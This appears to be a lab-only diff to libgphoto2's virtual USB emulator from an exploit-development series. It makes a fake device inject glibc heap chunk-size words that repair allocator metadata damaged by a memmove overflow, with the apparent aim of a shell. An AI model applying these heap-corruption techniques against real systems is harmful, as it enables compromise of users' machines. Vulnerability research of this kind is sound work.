@@ -1,0 +1,26 @@
+# W194 lab-only vusb diff, relative to the W193 tree after
+# live/vusb-jl2005.patch, evidence/replay-vusb-local-modes.patch,
+# evidence/replay-vusb-ret.patch and evidence/replay-vusb-partial-priv.patch.
+# Mode r plus M2SHELL_W194_REPAIR=1 supplies three constant glibc size words
+# that the W193 :154 memmove would otherwise zero. The constants are measured
+# on this build's heap (0x3ab0 unsorted-victim chunk size, 0x4051 priv chunk
+# size); they are NOT live addresses and NOT device-observable. This is a
+# lab-assisted experiment, not a claim that a device can recover host metadata.
+--- a/libgphoto2_port/vusb/vusb.c
++++ b/libgphoto2_port/vusb/vusb.c
+@@ -184,6 +184,15 @@
+ 				bytes[0x1e0] = 0x00; /* data_to_read = 0x200 */
+ 				bytes[0x1e1] = 0x02;
+ 			}
++			if (m2[0] == 'r' && getenv("M2SHELL_W194_REPAIR")) {
++				/* W194 lab experiment: device supplies constant glibc
++				 * chunk-size words that the :154 memmove would zero. */
++				bytes[0x168] = 0x40;  /* nextchunk size at priv-0x58, prev_inuse clear */
++				bytes[0x1b8] = 0x51;  /* priv chunk size 0x4051 */
++				bytes[0x1b9] = 0x40;
++				bytes[0x160] = 0xb0;  /* nextchunk->prev_size at priv-0x60 */
++				bytes[0x161] = 0x3a;  /* victim chunk size 0x3ab0 */
++			}
+ 			return size;
+ 		}
+ 		{
